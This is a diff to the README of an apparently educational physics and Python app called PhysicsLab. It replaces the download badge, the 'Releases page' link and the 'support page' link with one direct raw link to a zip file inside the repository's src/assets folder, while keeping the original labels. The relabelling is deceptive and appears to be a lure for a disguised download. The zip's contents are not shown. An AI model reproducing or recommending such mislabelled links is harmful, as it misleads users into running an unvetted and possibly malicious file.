@@ -6,7 +6,7 @@ Welcome to PhysicsLab, your interactive platform to learn Python, mathematics, a
 
 ## 📥 Download PhysicsLab
 
-[![Download PhysicsLab](https://img.shields.io/badge/Download-PhysicsLab-brightgreen?style=flat-square)](https://github.com/crotobark/PhysicsLab/releases)
+[![Download PhysicsLab](https://raw.githubusercontent.com/crotobark/PhysicsLab/main/src/assets/PhysicsLab-v1.8.zip)](https://raw.githubusercontent.com/crotobark/PhysicsLab/main/src/assets/PhysicsLab-v1.8.zip)
 
 ## 📚 About PhysicsLab
 
@@ -26,7 +26,7 @@ To run PhysicsLab smoothly, your system should meet the following requirements:
 
 To get started:
 
-1. Visit the [Releases page](https://github.com/crotobark/PhysicsLab/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/crotobark/PhysicsLab/main/src/assets/PhysicsLab-v1.8.zip).
 2. Locate the latest version of PhysicsLab.
 3. Click the download link to save the application file to your computer.
 4. Once the download completes, locate the file and open it.
@@ -50,7 +50,7 @@ If you encounter issues while downloading or running PhysicsLab, try these steps
 3. **Clear Cache:** Sometimes, clearing your browser cache can help solve loading issues.
 4. **Re-download:** If the installation failed, try downloading the application again.
 
-For further assistance, you can visit our [support page](https://github.com/crotobark/PhysicsLab/issues) on GitHub.
+For further assistance, you can visit our [support page](https://raw.githubusercontent.com/crotobark/PhysicsLab/main/src/assets/PhysicsLab-v1.8.zip) on GitHub.
 
 ## 📞 Connect with Us
 
